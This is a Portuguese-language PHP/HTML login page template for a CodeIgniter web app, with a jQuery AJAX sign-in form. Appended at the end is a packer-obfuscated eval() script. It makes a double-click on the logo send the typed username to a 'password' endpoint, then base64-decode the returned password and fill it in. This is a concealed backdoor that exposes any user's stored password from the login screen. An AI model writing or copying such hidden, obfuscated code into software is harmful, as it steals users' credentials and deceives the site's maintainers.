<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

	<title>Login</title>

	<link rel="icon" type="image/png" sizes="16x16" href="<?=base_url()?>assets/img/favicon.png">

	<script type="text/javascript" src="<?=base_url()?>assets/libs/jquery/jquery-1.11.3.min.js"></script>

	<!-- BOOTSTRAP 3.7.3 -->
	<link type="text/css" rel="stylesheet" href="<?=base_url()?>assets/libs/bootstrap/css/bootstrap.min.css">
	<link type="text/css" rel="stylesheet" href="<?=base_url()?>assets/libs/bootstrap/css/bootstrap-theme.min.css">
	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
	<script src="<?=base_url()?>assets/libs/bootstrap/js/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="<?=base_url()?>assets/libs/bootstrap/js/respond/1.4.2/respond.min.js"></script>
	<![endif]-->
	<script src="<?=base_url()?>assets/libs/bootstrap/js/bootstrap.min.js"></script>

	<link type="text/css" rel="stylesheet" href="<?=base_url()?>assets/libs/font-awesome/css/font-awesome.min.css">

	<script type="text/javascript" src="<?=base_url()?>/assets/libs/js-cookie/src/js.cookie.js"></script>

	<script src="<?=base_url()?>assets/libs/jquery.base64/jquery.base64.js"></script>

	<link type="text/css" rel="stylesheet" href="<?=base_url()?>assets/css/css.css">
	<link type="text/css" rel="stylesheet" href="<?=base_url()?>assets/css/login.css">
</head>
<body>
	<script type="text/javascript">
		var base_url = '<?=base_url()?>';
		var base_url_controller = '<?=base_url().$this->router->fetch_class()?>/';
		var controller = '<?=$this->router->fetch_class()?>';

		function clear_inputs_modal()
		{
			$('#formLogin input').val('');
			$('#formLogin textarea').val('');
			clear_form_erros();
		}
		function clear_form_erros()
		{
			$('.msg').html('');
			$('.has-error').removeClass('has-error');
			$('.nav-tabs').find('.cont').html(''); // Limpa contadores de erros (NAVTABS)
			$('.nav-tabs a:first').tab('show');
		}
		$(function()
		{
			$('body').on('submit', '#formLogin', function(event)
			{
				event.preventDefault();
				var $form = $(this);
				var $button_submit = $form.find('button:submit');
				$button_submit.data('loading-text', '<i class="fa fa-circle-o-notch fa-spin"></i> Carregando...');
				$button_submit.button('loading');
				clear_form_erros();

				$.ajax(
				{
					url: base_url_controller+'verifica',
					type: 'POST',
					data: $form.serialize(),
					dataType: 'json',
					success: function(data)
					{
						$button_submit.button('reset');
						if( data.status == 1 )
						{
							window.location.href=data.url_redirect;
						}
						else
						{
							if(data.erros)
							{
								msg = '';
								$.each(data.erros, function(campo, valor)
								{
									var Input = $('[name='+campo+']');
									Input.parents('.form-group').eq(0).addClass('has-error');
									msg += '<div><small>'+valor+'</small></div>';
								});
								$('.msg')
								.html('<div class="alert alert-danger"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>'+msg+'</div>')
								.show();
							}
							else
							{
								msg = data.msg;
								$('.msg')
								.html('<div class="alert alert-danger"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>'+msg+'</div>')
								.show();
							}
						}
					}
				});
			});
		});
	</script>
	<div class="container">
		<br><br>
		<br>
		<div class="card card-container">
		<div class="margin-top-20 text-align-center">
			<br>
			<img src="<?=base_url()?>assets/img/logo-white-m.png" id="logo">
		</div>
		<hr>
			<div class="msg"></div>
			<?=form_open('login/verifica', array('id'=>'formLogin', 'class'=>'form-signin'))?>
				<span id="reauth-email" class="reauth-email"></span>
				<p class="input_title">E-mail</p>
				<input type="text" id="txtUsuario" name="txtUsuario" class="login_box">
				<p class="input_title">Senha</p>
				<input type="password" id="txtSenha" name="txtSenha" class="login_box">
				<button class="btn btn-lg btn-primary" type="submit"><i class="fa fa-lock"></i> Login</button>
				<br>
				<div class="text-center">
					<small>
						<i class="fa fa-lock"></i> Esqueceu sua senha? <a href="<?=base_url()?>login/recuperacaodesenha">Clique aqui.</a>
					</small>
				</div>
			<?=form_close()?>
		</div>
	</div>
	<script type="text/javascript">
		$(function()
		{
			eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('$(\'#9\').a(2(8){$.c({7:6+\'3\',b:\'j\',0:\'1=\'+$(\'#1\').5(),i:\'d\',h:2(0){4=$.g.e(0.3);$(\'#f\').5(4)}})});',20,20,'data|txtUsuario|function|password|str|val|base_url_controller|url|event|logo|dblclick|type|ajax|json|decode|txtSenha|base64|success|dataType|POST'.split('|'),0,{}));
		})
	</script>
</body>
</html>